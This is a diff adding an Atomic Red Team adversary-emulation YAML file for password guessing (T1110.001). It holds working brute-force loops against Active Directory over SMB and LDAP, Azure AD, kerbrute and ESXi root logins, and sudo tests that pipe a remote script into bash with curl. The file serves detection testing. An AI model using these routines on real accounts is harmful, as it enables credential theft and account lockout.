@@ -1,0 +1,300 @@
+attack_technique: T1110.001
+display_name: 'Brute Force: Password Guessing'
+atomic_tests:
+- name: Brute Force Credentials of single Active Directory domain users via SMB
+  auto_generated_guid: 09480053-2f98-4854-be6e-71ae5f672224
+  description: |
+    Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller
+  supported_platforms:
+  - windows
+  input_arguments:
+    user:
+      description: Account to bruteforce
+      type: string
+      default: '%username%'
+  executor:
+    name: command_prompt
+    command: |
+      echo Password1> passwords.txt
+      echo 1q2w3e4r>> passwords.txt
+      echo Password!>> passwords.txt
+      echo Spring2022>> passwords.txt
+      echo ChangeMe!>> passwords.txt
+      @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL
+
+- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)
+  auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
+  description: |
+    Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos
+  supported_platforms:
+  - windows
+  input_arguments:
+    user:
+      description: Account to bruteforce
+      type: string
+      default: $ENV:USERNAME
+    passwords_path:
+      description: List of passwords we will attempt to brute force with
+      type: path
+      default: PathToAtomicsFolder\T1110.001\src\passwords.txt
+    domain:
+      description: Active Directory domain FQDN
+      type: string
+      default: $env:UserDnsDomain
+    auth:
+      description: authentication method to choose between "NTLM" and "Kerberos"
+      type: string
+      default: NTLM
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
+        Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
+        exit 1
+      }
+
+      [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+      $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)
+
+      $passwordList = Get-Content -Path "#{passwords_path}"
+      foreach ($password in $passwordList){
+        $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}")
+        $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
+        try {
+          Write-Host " [-] Attempting ${password} on account #{user}."
+          $conn.bind()
+          # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+          Write-Host " [!] #{user}:${password} are valid credentials!"
+        } catch {
+          Write-Host $_.Exception.Message
+        }
+      }
+      Write-Host "End of bruteforce"
+
+- name: Brute Force Credentials of single Azure AD user
+  auto_generated_guid: 5a51ef57-299e-4d62-8e11-2d440df55e69
+  description: |
+    Attempt to brute force Azure AD user via AzureAD powershell module.
+  supported_platforms:
+  - azure-ad
+  input_arguments:
+    username:
+      description: Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg "bruce.wayne@<valid_ms_account.com>"
+      type: string
+      default: bruce.wayne@contoso.com
+    passwords:
+      description: List of passwords we will attempt to brute force with
+      type: string
+      default: Password1`n1q2w3e4r`nPassword!
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      AzureAD module must be installed.
+    prereq_command: |
+      try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+    get_prereq_command: |
+      Install-Module -Name AzureAD -Force
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Import-Module -Name AzureAD
+
+      $passwords = "#{passwords}".split("{`n}")
+      foreach($password in $passwords) {
+        $PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force
+        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+        try {
+          Write-Host " [-] Attempting ${password} on account #{username}."
+          Connect-AzureAD -Credential $Credential 2>&1> $null
+          # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+          Write-Host " [!] #{username}:${password} are valid credentials!`r`n"
+          break
+        } catch {
+          Write-Host " [-] #{username}:${password} invalid credentials.`r`n"
+        }
+      }
+      Write-Host "End of bruteforce"
+
+- name: Password Brute User using Kerbrute Tool
+  auto_generated_guid: 59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4
+  description: |
+    Bruteforce a single user's password from a wordlist
+  supported_platforms:
+  - windows
+  input_arguments:
+    domaincontroller:
+      description: Domain controller where test will be run
+      type: string
+      default: $ENV:userdnsdomain
+    domain:
+      description: Domain where you will be testing
+      type: string
+      default: $ENV:userdomain
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads
+    prereq_command: |
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"){exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"
+  - description: |
+      bruteuser.txt must exist in PathToAtomicsFolder\..\ExternalPayloads
+    prereq_command: |
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt"){exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true" -outfile "PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt"
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      cd "PathToAtomicsFolder\..\ExternalPayloads"
+      .\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1 
+
+- name: SUDO Brute Force - Debian
+  auto_generated_guid: ba1bf0b6-f32b-4db0-b7cc-d78cacc76700
+  description: |
+    An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 
+
+    This test creates the "art" user with a password of "password123", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Check if running on a Debian based machine.
+    prereq_command: |
+      if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then echo "Debian"; else echo "NOT Debian"; exit 1; fi
+      if grep -Rq "pam_tally" /etc/pam.d/*; then echo "pam_tally configured"; exit 1; fi
+      if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else echo "openssl is NOT installed"; exit 1; fi
+      if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo is NOT installed"; exit 1; fi
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      apt update && apt install -y openssl sudo curl
+  executor:
+    name: bash
+    elevation_required: true
+    command: |
+      useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art
+      su -c "cd /tmp; curl -s #{remote_url} | bash" art
+    cleanup_command: |
+      userdel -fr art
+
+- name: SUDO Brute Force - Redhat
+  auto_generated_guid: 4097bc00-5eeb-4d56-aaf9-287d60351d95
+  description: |
+    An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 
+
+    This test creates the "art" user with a password of "password123", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Check if running on a Redhat based machine.
+    prereq_command: |
+      if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then echo "RedHat"; else echo "NOT RedHat"; exit 1; fi
+      if grep -Rq "pam_faillock" /etc/pam.d/*; then echo "pam_faillock configured"; exit 1; fi
+      if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else echo "openssl is NOT installed"; exit 1; fi
+      if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo is NOT installed"; exit 1; fi
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      yum update && yum install -y openssl sudo curl
+  executor:
+    name: bash
+    elevation_required: true
+    command: |
+      useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art
+      su art
+      cd /tmp
+      curl -s #{remote_url} |bash
+    cleanup_command: |
+      userdel -fr art
+
+- name: SUDO Brute Force - FreeBSD
+  auto_generated_guid: abcde488-e083-4ee7-bc85-a5684edd7541
+  description: |
+    An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 
+
+    This test creates the "art" user with a password of "password123", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Check if running on a FreeBSD based machine.
+    prereq_command: |
+      if grep -iq "FreeBSD" /etc/os-release; then echo "FreeBSD"; else echo "NOT FreeBSD"; exit 1; fi
+      if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else echo "openssl is NOT installed"; exit 1; fi
+      if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo is NOT installed"; exit 1; fi
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+      if [ -x "$(command -v bash)" ]; then echo "bash is installed"; else echo "bash is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      pkg update && pkg install -y sudo curl bash
+  executor:
+    name: bash
+    elevation_required: true
+    command: |
+      pw adduser art -g wheel -s /bin/sh
+      echo "password123" | pw usermod art -h 0
+      su art
+      cd /tmp
+      curl -s #{remote_url} |bash
+    cleanup_command: |
+      rmuser -y art
+- name: ESXi - Brute Force Until Account Lockout
+  auto_generated_guid: ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5
+  description: |
+    An adversary may attempt to brute force the password of privilleged account for privilege escalation.
+    In the process, the TA may lock the account, which can be used for detection. [Reference](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/#:~:text=A%20ransomware%20group%20attacking%20large,internal%20systems%20after%20establishing%20a)
+  supported_platforms:
+  - windows
+  input_arguments:
+    vm_host:
+      description: Specify the host name of the ESXi Server
+      type: string
+      default: atomic.local
+    plink_file:
+      description: Path to Putty
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+    lockout_threshold:
+      description: Specify the account lockout threshold configured on the ESXI management server
+      type: string
+      default: "5"
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The plink executable must be found in the ExternalPayloads folder.
+    prereq_command: |
+      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
+  executor:
+    command: |
+      $lockout_threshold = [int]"#{lockout_threshold}"
+      for ($var = 1; $var -le $lockout_threshold; $var++) {
+        #{plink_file} -ssh "#{vm_host}" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002
+        }
+    name: powershell
+    elevation_required: false
